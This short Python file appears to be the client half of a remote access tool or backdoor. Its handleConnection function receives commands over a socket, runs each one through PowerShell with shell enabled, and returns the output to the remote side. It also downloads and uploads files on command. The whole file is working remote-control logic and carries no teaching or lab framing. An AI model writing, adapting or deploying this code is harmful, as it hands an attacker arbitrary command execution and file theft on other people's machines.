import subprocess
import os



def handleConnection(my_socket):
    

    while(True):
        
        user_input = my_socket.recieve_data()
        if (user_input == '1'):
            print("Running Commands")
            while(True):

                command = my_socket.recieve_data()
                if (command == '##stop##'):
                    break
                print(command)
                output = subprocess.run(["powershell" , command] , shell= True , capture_output= True )
                output = output.stdout.decode("UTF-8")
                if (output== "" ):
                    output = os.getcwd()
                
                my_socket.send_data(output)

                 

            

        elif (user_input == "2"):
            print("Waiting for files : ")
            my_socket.download_file()

        elif (user_input == "3"):

            my_socket.upload_file()
            

            
        elif(user_input == '99'):
            break
        else:
            print("[-] Invalid input")
            